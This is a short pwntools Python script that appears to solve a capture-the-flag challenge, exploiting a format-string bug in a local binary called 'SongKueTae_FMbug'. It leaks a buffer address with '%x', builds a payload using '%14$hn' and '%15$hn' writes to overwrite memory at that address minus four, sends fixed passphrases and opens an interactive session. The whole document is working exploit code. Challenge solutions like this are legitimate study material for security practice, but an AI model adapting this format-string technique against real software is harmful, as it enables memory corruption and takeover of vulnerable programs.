#!/usr/bin/env python
from pwn import *

conn = process("./SongKueTae_FMbug")

conn.recvuntil("input : ")
conn.sendline("%x")

buf_addr = conn.recvline().strip()
buf_addr = int(buf_addr,16)
random_addr = buf_addr - 4

high = buf_addr/0x10000
low = buf_addr%0x10000


conn.recvuntil("input : ")

payload = "%"+str(low)+"x"
payload += "%14$hn"
payload += "%"+str(high-low)+"x"
payload += "%15$hn"
payload += "A"*(32-len(payload))
payload += p32(random_addr)
payload += p32(random_addr+2)
conn.sendline(payload)

conn.recvuntil("input : ")
conn.sendline("MyriaBreak\x00")

conn.recvuntil("did you find key?")
conn.sendline("SongGyutae is Best of Best\x00")
conn.interactive()



